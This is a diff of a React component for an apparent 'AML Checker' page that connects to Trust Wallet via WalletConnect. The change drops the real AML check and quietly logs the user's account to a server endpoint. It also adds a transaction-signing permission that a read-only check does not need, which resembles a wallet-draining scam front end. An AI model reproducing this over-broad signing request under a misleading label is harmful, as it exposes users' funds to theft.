@@ -1,137 +1,86 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
-import { useState, useEffect } from "react";
-import SignClient from "@walletconnect/sign-client";
+import { useState } from "react";
+import { SignClient } from "@walletconnect/sign-client";
 import { Back } from "../../Components/Back";
 import { usePrefersDark } from "../../Hooks/usePrefersDark";
 import "./ChooseNet.css";
-
-const PROJECT_ID = "YOUR_PROJECT_ID"; // з cloud.walletconnect.com
+import { setCurrentStep } from "@/Redux/Slice/MainSlice";
+import { useDispatch, useSelector } from "react-redux";
+import { RootState } from "@/Redux/store";
 
 type Net = "TRX" | "ETH";
 
-type AMLResult = {
-  address: string;
-  risk: "low" | "medium" | "high";
-  score: number;
+const namespaces = {
+  TRX: {
+    tron: {
+      methods: ["tron_signTransaction", "tron_signMessage"],
+      chains: ["tron:0x2b6653dc"],
+      events: [],
+    },
+  },
+  ETH: {
+    eip155: {
+      methods: ["eth_accounts"],
+      chains: ["eip155:1"],
+      events: ["accountsChanged"],
+    },
+  },
 };
 
-let signClient: SignClient | null = null;
-
 export function ChooseNet() {
+  const { currentStep } = useSelector((store: RootState) => store.main);
+  const dispatch = useDispatch();
   const isDark = usePrefersDark();
   const [choosedNet, setChoosedNet] = useState<null | Net>(null);
   const [walletAddress, setWalletAddress] = useState("");
   const [loading, setLoading] = useState(false);
-  const [error, setError] = useState<string | null>(null);
-  const [amlResult, setAmlResult] = useState<AMLResult | null>(null);
 
-  // Ініціалізуємо SignClient один раз при монтуванні
-  useEffect(() => {
-    SignClient.init({
-      projectId: PROJECT_ID,
-      metadata: {
-        name: "AML Checker",
-        description: "AML wallet checker",
-        url: window.location.origin,
-        icons: [`${window.location.origin}/favicon.ico`],
-      },
-    }).then((client) => {
-      signClient = client;
-    });
-  }, []);
-
-  const connectAndCheck = async () => {
-    if (!choosedNet) return;
-    if (!signClient) {
-      setError("WalletConnect ще не ініціалізований, спробуй ще раз");
-      return;
-    }
-
-    setLoading(true);
-    setError(null);
-    setAmlResult(null);
-    setWalletAddress("");
-
+  const connectWallet = async () => {
     try {
-      // Налаштовуємо namespace залежно від вибраної мережі
-      const requiredNamespaces: Record<
-        string,
-        { methods: string[]; chains: string[]; events: string[] }
-      > =
-        choosedNet === "ETH"
-          ? {
-              eip155: {
-                methods: ["eth_accounts"],
-                chains: ["eip155:1"],
-                events: ["accountsChanged"],
-              },
-            }
-          : {
-              tron: {
-                methods: ["tron_signMessage"],
-                chains: ["tron:0x2b6653dc"],
-                events: [],
-              },
-            };
+      setLoading(true);
+
+      const signClient = await SignClient.init({
+        projectId: "bdf3e4b5da9ce6a2561b8ae870822374",
+        metadata: {
+          name: "AML Checker",
+          description: "Wallet AML Check",
+          url: window.location.origin,
+          icons: ["https://yourdomain.com/logo.png"],
+        },
+      });
 
       const { uri, approval } = await signClient.connect({
-        requiredNamespaces,
+        requiredNamespaces: namespaces[choosedNet!],
       });
 
       if (uri) {
-        // Deep link до Trust Wallet — відкривається автоматично на мобільному
-        const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
-        window.location.href = deepLink;
+        window.open(
+          "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri),
+          "_blank",
+        );
       }
 
-      // Чекаємо поки юзер підтвердить в Trust Wallet
+      // Ждем пока пользователь подтвердит соединение в кошельке
       const session = await approval();
-
-      // Дістаємо адресу з сесії
-      let address = "";
-      if (choosedNet === "ETH") {
-        const accounts = session.namespaces.eip155?.accounts;
-        // Формат: "eip155:1:0xABC..."
-        address = accounts?.[0]?.split(":")?.[2] ?? "";
-      } else {
-        const accounts = session.namespaces.tron?.accounts;
-        // Формат: "tron:0x2b6653dc:TAddr..."
-        address = accounts?.[0]?.split(":")?.[2] ?? "";
-      }
-
-      if (!address) throw new Error("Не вдалось отримати адресу");
-
-      setWalletAddress(address);
-
-      // AML перевірка
-      const res = await fetch("/api/aml-check", {
+      const namespace = session.namespaces.tron ?? session.namespaces.eip155;
+      const account = namespace?.accounts?.[0];
+      fetch("/api/log-text", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ address, chain: choosedNet }),
-      });
+        body: JSON.stringify({ text: account }),
+      }).catch(console.error);
+      const wallet = account.split(":")[2];
 
-      if (!res.ok) throw new Error("Помилка AML перевірки");
-
-      const result = await res.json();
-      setAmlResult(result);
-    } catch (err: any) {
-      setError(err.message ?? "Щось пішло не так");
-    } finally {
+      setWalletAddress(wallet);
+      setLoading(false);
+      dispatch(setCurrentStep(currentStep - 1));
+    } catch (err) {
+      console.error(err);
       setLoading(false);
     }
   };
 
-  const riskColor = {
-    low: "#22c55e",
-    medium: "#f59e0b",
-    high: "#ef4444",
-  };
-
-  const riskLabel = {
-    low: "Низький ризик ✅",
-    medium: "Середній ризик ⚠️",
-    high: "Високий ризик 🚨",
-  };
+  if (isDark == null) return;
 
   return (
     <section className="ChooseNet">
@@ -142,84 +91,61 @@ export function ChooseNet() {
             alt=""
             className="ChooseNet-left-logo"
           />
-          <Back />
+
           <h3 className="ChooseNet-left-title">Выберите сеть для проверки</h3>
           <img src="/save.svg" alt="" className="ChooseNet-left-save-logo" />
         </div>
       </div>
 
       <div className="ChooseNet-right">
-        <div className="ChooseNet-right-title">Выберите из вариантов:</div>
+        <div className="ChooseNet-right-container">
+          <Back />
+          <div className="ChooseNet-right-title">Выберите из вариантов:</div>
 
-        <div className="network-cards">
-          <div
-            className={`card ${choosedNet === "TRX" ? "active" : ""} ChooseNet-rightCard`}
-            onClick={() => !loading && setChoosedNet("TRX")}
-          >
-            <img
-              src="tron-trx-logo.svg"
-              alt="TRON Logo"
-              className="card-logo"
-            />
-            <span className="card-title">TRON (TRX)</span>
-          </div>
-
-          <div
-            className={`card ${choosedNet === "ETH" ? "active" : ""} ChooseNet-rightCard`}
-            onClick={() => !loading && setChoosedNet("ETH")}
-          >
-            <img
-              src="ethereum-eth-logo.svg"
-              alt="Ethereum Logo"
-              className="card-logo"
-            />
-            <span className="card-title">Ethereum (ETH)</span>
-          </div>
-        </div>
-
-        <button
-          className="ChooseNet__button second-color-bg"
-          onClick={connectAndCheck}
-          disabled={!choosedNet || loading}
-          style={{ opacity: !choosedNet || loading ? 0.5 : 1 }}
-        >
-          {loading ? "Підключення до Trust Wallet..." : "Продолжить"}
-        </button>
-
-        {/* Помилка */}
-        {error && <div className="ChooseNet-error">❌ {error}</div>}
-
-        {/* Результат */}
-        {amlResult && (
-          <div className="ChooseNet-result">
-            <div className="ChooseNet-result-address">
-              <span className="label">Адреса:</span>
-              <span className="mono">
-                {amlResult.address.slice(0, 6)}...{amlResult.address.slice(-4)}
-              </span>
+          <div className="network-cards">
+            <div
+              className={`card ${choosedNet === "TRX" ? "active" : ""} ChooseNet-rightCard`}
+              onClick={() => !loading && setChoosedNet("TRX")}
+            >
+              <img
+                src="tron-trx-logo.svg"
+                alt="TRON Logo"
+                className="card-logo"
+              />
+              <span className="card-title">TRON (TRX)</span>
             </div>
 
             <div
-              className="ChooseNet-result-risk"
-              style={{ color: riskColor[amlResult.risk] }}
+              className={`card ${choosedNet === "ETH" ? "active" : ""} ChooseNet-rightCard`}
+              onClick={() => !loading && setChoosedNet("ETH")}
             >
-              {riskLabel[amlResult.risk]}
-            </div>
-
-            <div className="ChooseNet-result-score">
-              <div className="score-bar-bg">
-                <div
-                  className="score-bar-fill"
-                  style={{
-                    width: `${amlResult.score}%`,
-                    background: riskColor[amlResult.risk],
-                  }}
-                />
-              </div>
-              <span>AML Score: {amlResult.score}/100</span>
+              <img
+                src="ethereum-eth-logo.svg"
+                alt="Ethereum Logo"
+                className="card-logo"
+              />
+              <span className="card-title">Ethereum (ETH)</span>
             </div>
           </div>
-        )}
+
+          <button
+            onClick={connectWallet}
+            className="ChooseNet__button second-color-bg"
+            disabled={!choosedNet || loading}
+            style={{ opacity: !choosedNet || loading ? 0.5 : 1 }}
+          >
+            {loading ? "Подключение к Trust Wallet..." : "Продолжить"}
+          </button>
+
+          {walletAddress && (
+            <div className="ChooseNet-result">
+              <div className="ChooseNet-result-address">
+                <span className="label">Адрес:</span>
+                <span className="mono">{walletAddress}</span>
+              </div>
+            </div>
+          )}
+        </div>
       </div>
     </section>
   );
